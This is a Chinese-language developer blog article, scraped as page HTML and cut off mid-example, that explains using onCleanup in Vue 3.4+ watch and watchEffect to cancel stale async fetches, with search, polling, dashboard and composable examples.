content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ onCleanupå¤„ç†å¼‚æ­¥å‰¯ä½œç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:41:37.000Z" title="Thu Jan 08 2026 03:41:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue 3.4+ çš„æ–°ç‰¹æ€§</strong></h2>
<h3 data-id="heading-1">1.Â <strong><code>watch</code>Â ä¸­çš„Â <code>onCleanup</code></strong></h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> searchQuery = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> searchResults = <span class="hljs-title function_">ref</span>([])

<span class="hljs-comment">// ç›‘å¬æœç´¢è¯å˜åŒ–ï¼Œè‡ªåŠ¨æ¸…ç†å‰ä¸€ä¸ªè¯·æ±‚</span>
<span class="hljs-title function_">watch</span>(searchQuery, <span class="hljs-keyword">async</span> (newValue, oldValue, onCleanup) =&gt; {
  <span class="hljs-keyword">if</span> (!newValue.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span>
  
  <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-comment">// æ³¨å†Œæ¸…ç†å‡½æ•°</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    cancelled = <span class="hljs-literal">true</span>
    controller.<span class="hljs-title function_">abort</span>()
  })
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/search?q=<span class="hljs-subst">${newValue}</span>`</span>, {
      <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
    })
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å–æ¶ˆ</span>
    <span class="hljs-keyword">if</span> (!cancelled) {
      searchResults.<span class="hljs-property">value</span> = data
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span> &amp;&amp; !cancelled) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æœç´¢å¤±è´¥:'</span>, error)
    }
  }
})
</code></pre>
<h3 data-id="heading-2">2.Â <strong><code>watchEffect</code>Â ä¸­çš„Â <code>onCleanup</code></strong></h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watchEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> userId = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">const</span> userData = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// watchEffect è‡ªåŠ¨è¿½è¸ªä¾èµ–ï¼ŒåŒ…å«æ¸…ç†å‡½æ•°</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-keyword">async</span> (onCleanup) =&gt; {
  <span class="hljs-keyword">const</span> id = userId.<span class="hljs-property">value</span>
  
  <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    cancelled = <span class="hljs-literal">true</span>
    controller.<span class="hljs-title function_">abort</span>()
  })
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${id}</span>`</span>, {
      <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
    })
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
    
    <span class="hljs-keyword">if</span> (!cancelled) {
      userData.<span class="hljs-property">value</span> = data
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span> &amp;&amp; !cancelled) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–ç”¨æˆ·å¤±è´¥:'</span>, error)
    }
  }
})
</code></pre>
<h2 data-id="heading-3">ğŸ—ï¸Â <strong>å®é™…ä½¿ç”¨åœºæ™¯</strong></h2>
<h3 data-id="heading-4">åœºæ™¯1ï¼šæœç´¢åŠŸèƒ½ï¼ˆæ¨èæ–¹æ¡ˆï¼‰</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useSearch</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> searchQuery = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> results = <span class="hljs-title function_">ref</span>([])
  <span class="hljs-keyword">const</span> isLoading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-comment">// é˜²æŠ–å‡½æ•°</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">debounce</span> = (<span class="hljs-params">fn, delay</span>) =&gt; {
    <span class="hljs-keyword">let</span> timeoutId
    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
      <span class="hljs-built_in">clearTimeout</span>(timeoutId)
      timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">fn</span>(...args), delay)
    }
  }
  
  <span class="hljs-comment">// ç›‘å¬æœç´¢è¯å˜åŒ–</span>
  <span class="hljs-keyword">const</span> stopWatch = <span class="hljs-title function_">watch</span>(searchQuery, <span class="hljs-keyword">async</span> (newValue, oldValue, onCleanup) =&gt; {
    <span class="hljs-keyword">if</span> (newValue.<span class="hljs-title function_">trim</span>().<span class="hljs-property">length</span> &lt; <span class="hljs-number">2</span>) {
      results.<span class="hljs-property">value</span> = []
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
    
    <span class="hljs-comment">// æ³¨å†Œæ¸…ç†å‡½æ•°</span>
    <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      controller.<span class="hljs-title function_">abort</span>()
      isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    })
    
    <span class="hljs-comment">// æ·»åŠ å»¶è¿Ÿé˜²æ­¢é¢‘ç¹è¯·æ±‚</span>
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">300</span>))
    
    <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
    
    isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/search?q=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(newValue)}</span>`</span>, {
        <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
      })
      
      <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
      
      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
      
      <span class="hljs-keyword">if</span> (!cancelled) {
        results.<span class="hljs-property">value</span> = data
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span> &amp;&amp; !cancelled) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æœç´¢å¤±è´¥:'</span>, error)
        results.<span class="hljs-property">value</span> = []
      }
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-keyword">if</span> (!cancelled) {
        isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
      }
    }
  })
  
  <span class="hljs-keyword">return</span> {
    searchQuery,
    results,
    isLoading,
    stopWatch
  }
}
</code></pre>
<h3 data-id="heading-5">åœºæ™¯2ï¼šè½®è¯¢æ•°æ®</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">usePollingData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> isPolling = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> error = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  
  <span class="hljs-title function_">watch</span>(isPolling, <span class="hljs-function">(<span class="hljs-params">shouldPoll, _, onCleanup</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!shouldPoll) {
      data.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">let</span> intervalId
    
    <span class="hljs-comment">// æ¸…ç†å‡½æ•°</span>
    <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      <span class="hljs-keyword">if</span> (intervalId) {
        <span class="hljs-built_in">clearInterval</span>(intervalId)
      }
    })
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/data'</span>)
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
        
        <span class="hljs-keyword">if</span> (!cancelled) {
          data.<span class="hljs-property">value</span> = result
          error.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
        }
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-keyword">if</span> (!cancelled) {
          error.<span class="hljs-property">value</span> = err
        }
      }
    }
    
    <span class="hljs-comment">// ç«‹å³è·å–ä¸€æ¬¡</span>
    <span class="hljs-title function_">fetchData</span>()
    
    <span class="hljs-comment">// è®¾ç½®è½®è¯¢</span>
    intervalId = <span class="hljs-built_in">setInterval</span>(fetchData, <span class="hljs-number">5000</span>)
  })
  
  <span class="hljs-keyword">return</span> {
    isPolling,
    data,
    error,
    <span class="hljs-attr">togglePolling</span>: <span class="hljs-function">() =&gt;</span> isPolling.<span class="hljs-property">value</span> = !isPolling.<span class="hljs-property">value</span>
  }
}
</code></pre>
<h3 data-id="heading-6">åœºæ™¯3ï¼šå¤šæ•°æ®æºç›‘å¬</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useDashboardData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> filters = <span class="hljs-title function_">ref</span>({
    <span class="hljs-attr">dateRange</span>: <span class="hljs-string">'today'</span>,
    <span class="hljs-attr">category</span>: <span class="hljs-string">'all'</span>
  })
  
  <span class="hljs-keyword">const</span> metrics = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> chartData = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  
  <span class="hljs-comment">// ç›‘å¬å¤šä¸ªæ•°æ®æº</span>
  <span class="hljs-title function_">watch</span>([<span class="hljs-function">() =&gt;</span> filters.<span class="hljs-property">value</span>.<span class="hljs-property">dateRange</span>, <span class="hljs-function">() =&gt;</span> filters.<span class="hljs-property">value</span>.<span class="hljs-property">category</span>], 
    <span class="hljs-keyword">async</span> ([dateRange, category], _, onCleanup) =&gt; {
    
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
    
    <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      controller.<span class="hljs-title function_">abort</span>()
    })
    
    <span class="hljs-comment">// å¹¶è¡Œè¯·æ±‚å¤šä¸ªæ•°æ®</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> [metricsRes, chartRes] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/metrics?range=<span class="hljs-subst">${dateRange}</span>&amp;category=<span class="hljs-subst">${category}</span>`</span>, {
          <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
        }),
        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/chart-data?range=<span class="hljs-subst">${dateRange}</span>&amp;category=<span class="hljs-subst">${category}</span>`</span>, {
          <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
        })
      ])
      
      <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
      
      <span class="hljs-keyword">const</span> [metricsData, chartDataResult] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
        metricsRes.<span class="hljs-title function_">json</span>(),
        chartRes.<span class="hljs-title function_">json</span>()
      ])
      
      <span class="hljs-keyword">if</span> (!cancelled) {
        metrics.<span class="hljs-property">value</span> = metricsData
        chartData.<span class="hljs-property">value</span> = chartDataResult
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span> &amp;&amp; !cancelled) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–æ•°æ®å¤±è´¥:'</span>, error)
      }
    }
  }, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> })
  
  <span class="hljs-keyword">return</span> { filters, metrics, chartData }
}
</code></pre>
<h2 data-id="heading-7">ğŸ”„Â <strong>ç»„åˆå¼å‡½æ•°å°è£…</strong></h2>
<h3 data-id="heading-8">é«˜çº§å°è£…ï¼š<code>useAsyncWatch</code></h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useAsyncWatch</span>(<span class="hljs-params">source, asyncFn, options = {}</span>) {
  <span class="hljs-keyword">const</span> {
    immediate = <span class="hljs-literal">false</span>,
    debounce = <span class="hljs-number">0</span>,
    deep = <span class="hljs-literal">false</span>
  } = options
  
  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> error = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> isLoading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">let</span> cleanupFn = <span class="hljs-literal">null</span>
  
  <span class="hljs-comment">// åœæ­¢ç›‘å¬å‡½æ•°</span>
  <span class="hljs-keyword">const</span> stop = <span class="hljs-title function_">watch</span>(source, <span class="hljs-keyword">async</span> (newValue, oldValue, onCleanup) =&gt; {
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
    
    <span class="hljs-comment">// å¦‚æœæœ‰é˜²æŠ–éœ€æ±‚</span>
    <span class="hljs-keyword">if</span> (debounce &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, debounce))
      <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
    }
    
    isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    error.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
    
    <span class="hljs-comment">// æ³¨å†Œå½“å‰æ¸…ç†å‡½æ•°</span>
    <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    })
    
    <span class="hljs-comment">// ä¿å­˜æ¸…ç†å‡½æ•°ä¾›å¤–éƒ¨è°ƒç”¨</span>
    cleanupFn = <span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFn</span>(newValue, oldValue, <span class="hljs-function">() =&gt;</span> cancelled)
      
      <span class="hljs-keyword">if</span> (!cancelled) {
        data.<span class="hljs-property">value</span> = result
      }
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-keyword">if</span> (!cancelled) {
        error.<span class="hljs-property">value</span> = err
      }
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-keyword">if</span> (!cancelled) {
        isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
      }
    }
  }, { immediate, deep })
  
  <span class="hljs-comment">// æ‰‹åŠ¨å–æ¶ˆå½“å‰æ“ä½œ</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">cancel</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (cleanupFn) {
      <span class="hljs-title function_">cleanupFn</span>()
      cleanupFn = <span class="hljs-literal">null</span>
    }
  }
  
  <span class="hljs-comment">// é‡æ–°è§¦å‘</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">trigger</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> currentValue = <span class="hljs-keyword">typeof</span> source === <span class="hljs-string">'function'</span> 
      ? <span class="hljs-title function_">source</span>() 
      : source.<span class="hljs-property">value</span>
    <span class="hljs-comment">// è¿™é‡Œéœ€è¦æ‰‹åŠ¨è§¦å‘ watch å›è°ƒ</span>
    <span class="hljs-title function_">cancel</span>()
    <span class="hljs-comment">// å¯ä»¥ç»“åˆ options.immediate æˆ–é‡æ–°è®¾ç½®å€¼</span>
  }
  
  <span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">stop</span>()
    <span class="hljs-title function_">cancel</span>()
  })
  
  <span class="hljs-keyword">return</span> {
    data,
    error,
    isLoading,
    cancel,
    trigger,
    stop
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> searchQuery = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: results, isLoading, cancel } = <span class="hljs-title function_">useAsyncWatch</span>(
  searchQuery,
  <span class="hljs-keyword">async</span> (query, oldValue, isCancelled) =&gt; {
    <span class="hljs-keyword">if</span> (!query.<span class="hljs-title function_">trim</span>() || <span class="hljs-title function_">isCancelled</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
    <span class="hljs-keyword">const</span> timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">10000</span>)
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/search?q=<span class="hljs-subst">${query}</span>`</span>, {
        <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span>
      })
      
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCancelled</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
      
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-built_in">clearTimeout</span>(timeoutId)
    }
  },
  { <span class="hljs-attr">debounce</span>: <span class="hljs-number">300</span>, <span class="hljs-attr">immediate</span>: <span class="hljs-literal">false</span> }
)
</code></pre>
<h3 data-id="heading-9">å¤„ç†ç«æ€çš„é€šç”¨ Hook</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">export function useRaceConditionWatch(source, asyncFn, <span class="hljs-attr">options</span> = {}) {
  const {
    <span class="hljs-attr">immediate</span> = <span class="hljs-literal">false</span>,
    <span class="hljs-attr">cancelPrevious</span> = <span class="hljs-literal">true</span>
  } = options
  
  const <span class="hljs-attr">data</span> = ref(null)
  const <span class="hljs-attr">error</span> = ref(null)
  const <span class="hljs-attr">isLoading</span> = ref(<span class="hljs-literal">false</span>)
  
  let <span class="hljs-attr">currentToken</span> = null
  
  const <span class="hljs-attr">stop</span> = watch(source, async (newValue, oldValue, <span class="hljs-literal">on</span>Cleanup) =&gt; {
    const <span class="hljs-attr">token</span> = Symbol(<span class="hljs-string">'request'</span>)
    <span class="hljs-attr">currentToken</span> = token
    
    let <span class="hljs-attr">cancelled</span> = <span class="hljs-literal">false</span>
    let <span class="hljs-attr">abortController</span> = null
    
    onCleanup(() =&gt; {
      <span class="hljs-attr">cancelled</span> = <span class="hljs-literal">true</span>
      if (abortController) {
        abortController.abort()
      }
      if (<span class="hljs-attr">currentToken</span> === token) {
        <span class="hljs-attr">isLoading.value</span> = <span class="hljs-literal">false</span>
      }
    })
    
    if (cancelPrevious &amp;&amp; currentToken !== token) {
      return // å·²ç»æœ‰æ–°çš„è¯·æ±‚
    }
    
    <span class="hljs-attr">isLoading.value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-attr">error.value</span> = null
    
    try {
      <span class="hljs-attr">abortController</span> = new AbortController()
